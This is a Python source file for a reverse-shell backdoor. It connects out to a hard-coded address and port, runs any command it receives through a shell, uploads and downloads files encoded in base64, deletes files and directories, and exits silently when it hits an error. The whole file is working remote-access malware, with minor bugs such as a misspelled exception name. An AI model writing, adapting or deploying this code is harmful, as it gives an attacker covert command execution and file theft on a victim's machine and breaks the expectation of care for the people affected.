import base64
import json
import os
import socket
import subprocess
import sys


class Backdoor(object):
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.settimeout(None)
		self.connection.connect((ip, port))
		self.connection.send(b"\nconnection established\n")
	
	def reliable_send(self, data):
		json_data = json.dumps(data.decode())
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = ''
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except ValueError:
				continue
	
	def executecommand(self, command):
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_dir(self, path):
		try:
			os.chdir(path)
			return "changing directory to" + path
		except FileNotFoundError:
			return 'No directory named ' + path

	def remove_dir(self, path):
		try:
			os.remove(path)
			return "removed " + path
		except IsAdirectoryError:
			os.rmdir(path)
			return "removed a directory " + path
		

	def read_file(self, path):
		with open(path, 'rb') as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, 'wb') as file:
			file.write(base64.b64decode(content))
			return "upload successful "

		 
	def run(self):
		while True:
			command = self.reliable_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					#commandresult = self.change_dir(command[1])
					commandresult = self.change_dir(command[1]).encode()
				elif command[0] == "download":
					commandresult = self.read_file(command[1])
				elif command[0] == "upload":
					commandresult = self.write_file(command[1],command[2]).encode()
				elif command[0] == "del":
					commandresult = self.remove_dir(command[1]).encode()
				else:
					commandresult = self.executecommand(command)
			except Exception as e:
				self.reliable_send(b'command not found')
					
			self.reliable_send(commandresult)


try:
	my_backdoor = Backdoor("192.168.1.8",5555)
	my_backdoor.run()
except Exception as e:
	sys.exit()
